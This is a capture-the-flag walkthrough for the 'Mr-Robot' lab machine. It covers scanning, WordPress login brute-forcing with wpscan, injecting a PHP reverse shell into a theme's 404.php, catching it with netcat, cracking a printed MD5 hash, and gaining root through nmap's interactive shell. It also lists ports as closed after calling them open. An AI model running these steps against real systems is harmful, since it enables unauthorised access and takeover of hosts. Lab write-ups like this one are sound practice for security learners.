THE MACHINE IS MR-ROBOT

For firts thing we run the tool name Nmap: 

	nmap -p- IPMACHINE

we foud two ports open wich there are:

	PORT    STATE  SERVICE
	22/tcp  closed ssh
	80/tcp  closed http
	443/tcp closed https

open the website and run the gobuster
we found a lot of page , the must importants are 

	/robots.txt
	/login

in robots.txt the found the first key and a file dictionary
now it's time to bruteforce the pannel of login whit hydra or wpscan whit dictionary 

we found the username: Elliot

now whit wpscan

	wpscan --url IP -U elliot -P fsocity.dic
  
we found the password for the access 
Now go for theme twenty fifteen chose the templet into 404.php
Here insert a php reverse shell 
Open port to listening 

	nc -lvpn 9001

browse the following URL to run the injected php code

	http://IP/wordpress/wp-content/themes/twentyfifteen/404.php

the rev shell worked and we found the second key , but the permission is denied
there is another file called password.raw-md5
open it 

	robot:c3fcd3d76192e4007dfb496cca67e13b

decrypt the strings whit md5 for have the password for robot

	su robot 

insert the password decrypted
now you can open the second key

Now the need  do escalate our privilage.For do that , we use another tool called linepas.
run this on the machine for extract the information for possible privialge escalation.

the vuln is on NMAP 
it runs as root 
search the exploit GTFO

	nmap --interactive
	nmap> !sh

we are root , can steal the last flag in directory root